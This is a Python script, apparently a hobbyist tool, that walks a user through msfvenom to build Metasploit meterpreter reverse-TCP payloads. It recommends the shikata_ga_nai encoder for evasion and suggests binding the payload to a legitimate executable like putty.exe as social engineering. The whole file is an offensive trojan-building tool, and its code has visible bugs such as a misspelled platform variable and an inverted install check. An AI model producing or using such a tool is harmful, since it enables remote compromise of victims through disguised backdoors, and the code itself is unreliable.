import sys
import os
import socket
import subprocess
import urllib
import requests

def verif():
    if not os.path.exists('c:/metasploit') or os.path.exists('/usr/share/locale/metasploit-framework'):
        if os.name == 'nt':
            urllib.urlopen('https://downloads.metasploit.com/data/releases/metasploit-latest-windows-x64-installer.exe')
        else:
            os.system('git clone https://github.com/rapid7/metasploit-framework.git')

def settings(ip):
	port=''
	platform=''
	encoder=''
	small=''
	bind=''
	formate=''
	name=''
	payload=''
	ip='lhost='+ip
	print('')
	print('###Always check that you have forwarded the required port on your router###')
	port=raw_input("Select your listening port : ")
	port='lport='+port
	print(""" 
+---------------+--------------------+---------------------+
|  !#Platform#! | #Transform formats | #Executable formats |
+---------------+--------------------+---------------------+
| aix           | bash               | asp                 |
| android       | c                  | aspx                |
| apple_ios     | csharp             | aspx-exe            |
| bsd           | dw                 | dll                 |
| cisco         | dword              | elf                 |
| osx           | hex                | elf-so              |
| java          | java               | exe                 |
| unix          | js_be              | exe-only            |
| solaris       | js_le              | exe-service         |
| windows       | num                | exe-small           |
| ruby          | perl               | loop-vbs            |
| nodejs        | pl                 | macho               |
| linux         | powershell         | msi                 |
| java          | ps1                | msi-nouac           |
| php           | py                 | osx-app             |
| python        | python             | psh                 |
| juniper       | raw                | psh-net             |
| hpux          | rb                 | psh-reflection      |
| hardware      | ruby               | vba                 |
| mainframe     | sh                 | vba-exe             |
| openbsd       | vbapplication      | vbs                 |
| bsdi          | vbscript           | war                 |
+---------------+--------------------+---------------------+
		""")
	print("")
	print("Select the target platform , If not known please leave blank")
	paltform = raw_input("Choice : ")
	if platform =='':
		platform =''
	else : 
		platform = '--platform '+platform
	formate=raw_input("Select the desired payload format from the list above : ")
	if formate == "":
		formate = raw_input("A format must be selected : ")
		formate = '-f '+formate
	else: 
		formate = '-f '+formate
	print("""
+------------------------------+-----------+--------------------------------------------------------+
|             Name             |   Rank    |                      Description                       |
+------------------------------+-----------+--------------------------------------------------------+
| cmd/echo                     | good      | Echo Command Encoder                                   |
| cmd/generic_sh               | manual    |  Generic Shell Variable Substitution Command Encoder   |
| cmd/ifs                      | low       | Generic (IFS)  Substitution Command Encoder            |
| cmd/perl                     | normal    |  Perl Command Encoder                                  |
| cmd/powershell_base64        | excellent | Powershell Base64 Command Encoder                      |
| cmd/printf_php_mq            | manual    | printf(1) via PHP magic_quotes Utility Command Encoder |
| generic/eicar                | manual    | The EICAR Encoder                                      |
| generic/none                 | normal    | The "none" Encoder                                     |
| mipsbe/byte_xori             | normal    | Byte XORi Encoder                                      |
| mipsbe/longxor               | normal    | XOR Encoder                                            |
| mipsle/byte_xori             | normal    | Byte XORi Encoder                                      |
| mipsle/longxor               | normal    | XOR Encoder                                            |
| php/base64                   | great     | PHP Base64 Encoder                                     |
| ppc/longxor                  | normal    | PPC LongXOR Encoder                                    |
| ppc/longxor_tag              | normal    | PPC LongXOR Encoder                                    |
| sparc/longxor_tag            | normal    | SPARC DWORD XOR Encoder                                |
| x64/xor                      | normal    | XOR Encoder                                            |
| x86/add_sub                  | manual    | Add/Sub Encoder                                        |
| x86/alpha_mixed              | low       | Alpha2 Alphanumeric Mixedcase Encoder                  |
| x86/alpha_upper              | low       | Alpha2 Alphanumeric Uppercase Encoder                  |
| x86/avoid_underscore_tolower | manual    | Avoid underscore/tolower                               |
| x86/avoid_utf8_tolower       | manual    | Avoid UTF8/tolower                                     |
| x86/bloxor                   | manual    | BloXor - A Metamorphic Block Based XOR Encoder         |
| x86/call4_dword_xor          | normal    | Call+4 Dword XOR Encoder                               |
| x86/context_cpuid            | manual    | CPUID-based Context Keyed Payload Encoder              |
| x86/context_stat             | manual    | stat(2)-based Context Keyed Payload Encoder            |
| x86/context_time             | manual    | time(2)-based Context Keyed Payload Encoder            |
| x86/countdown                | normal    | Single-byte XOR Countdown Encoder                      |
| x86/fnstenv_mov              | normal    |  Variable-length Fnstenv/mov Dword XOR Encoder         |
| x86/jmp_call_additive        | normal    | Jump/Call XOR Additive Feedback Encoder                |
| x86/nonalpha                 | low       | Non-Alpha Encoder                                      |
| x86/nonupper                 | low       | Non-Upper Encoder                                      |
| x86/opt_sub                  | manual    | Sub Encoder (optimised)                                |
| x86/shikata_ga_nai           | excellent | Polymorphic XOR Additive Feedback Encoder              |
| x86/single_static_bit        | manual    | Single Static Bit                                      |
| x86/unicode_mixed            | manual    | Alpha2 Alphanumeric Unicode Mixedcase Encoder          |
| x86/unicode_upper            | manual    | Alpha2 Alphanumeric Unicode Uppercase Encoder          |
+------------------------------+-----------+--------------------------------------------------------+

FRIENDLY ADVICE : USE x86/shikata_ga_nai ;)

		""")
	encoder = raw_input("enter the name of the desired encoder , if none leave blank : ")
	if encoder=='':
		encoder = ''
	else :
		encoder = '-e '+encoder
	small = raw_input("Generate the smallest possible payload ? Y/N :")
	if small == 'y' or small == 'Y':
		small = '--smallest'
	else:
		small = ''
	print('')
	print("if you are creating an exe payload , Binding it with an existing real program would be greate as a social engineering technique")
	bind = raw_input("would you like to do this ? ( only with EXE payloads ) Y/N : ")
	if bind=='Y' or bind =='y':
		print("Enter the path of the real program that you want to bind your payload with (exemple : /root/desktop/putty.exe)")
		bind=raw_input('path:')
		bind='-x '+bind
	print("give a name to your payload + extention ( exemple : payload.php")
	name=raw_input('name+ext: ')
	name = '-o '+name
	if platform =='windows':
		payload ='-p '+'windows/meterpreter/reverse_tcp'
	else:
		payload ='-p '+'linux/x86/meterpreter/reverse_tcp'

	execution(ip,port,platform,encoder,small,bind,formate,name,payload)
def menu():
	print("")
	print("will you be using the payload for internal or external network purposes ? (e)=external / (i)=internal ")
	network=raw_input("Choice e/i : ")
	if network == 'e':
		from requests import get
		ipext = get('https://api.ipify.org').text
		settings(ipext)
	elif network == 'i':
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		s.connect(('8.8.8.8', 1))  # connect() for UDP doesn't send packets
		local_ip_address = s.getsockname()[0]
		print("By default we will be using this machine as a listener , ip : %s")%(local_ip_address)
		ipint=raw_input("If your listener is on this machine press enter , if not input the local ip adress of your listening device : ")
		if ipint == '':
			settings(local_ip_address)
		else:
			settings(ipint)
	else:
		print("verify your choice !!!")
		menu()
def logo():
    print (""" 
               _                            _         
              | |                          | |        
 __      _____| | ___ ___  _ __ ___   ___  | |_ ___   
 \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \  
  \ V  V /  __/ | (_| (_) | | | | | |  __/ | || (_) | 
  _\_/\_/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  
 | | | |                                              
 | |_| |__   ___    __ ___  _____ _ __                
 | __| '_ \ / _ \  / _` \ \/ / _ \ '__|               
 | |_| | | |  __/ | (_| |>  <  __/ |                  
  \__|_| |_|\___|  \__,_/_/\_\___|_|                 
 _________________.---.______
(_(______________(_o o_(____()
             .___.'. .'.___.
             \ o    Y    o /
              \ \__   __/ /
               '.__'-'__.'
                   '''                                                                                           
# This tool will help you understand and use the most of MSFvenom by RAPID7 #
          ### MAXIMISE YOUR CONSOLE SCREEN FOR BETTER RESULTS###
      """)   
def execution(ip,port,platform,encoder,small,bind,formate,name,payload):
	if os.name == 'nt':
		os.system('cd /metasploit-framework/bin && msfvenom.bat %s %s %s %s %s %s %s %s %s'%(ip,port,platform,encoder,small,bind,formate,name,payload))
	else:
		os.system('msfvenom -a x86 %s %s %s %s %s %s %s %s %s'%(ip,port,platform,encoder,small,bind,formate,name,payload))
def principale():
	x = raw_input("Do you have msfvenom installed ? Y / N : ")
	if x == 'n' or x == 'N':
    		verif()
	else:
    		logo()
    		menu()
if __name__ == "__main__":
    principale()
        
        
        
        
        
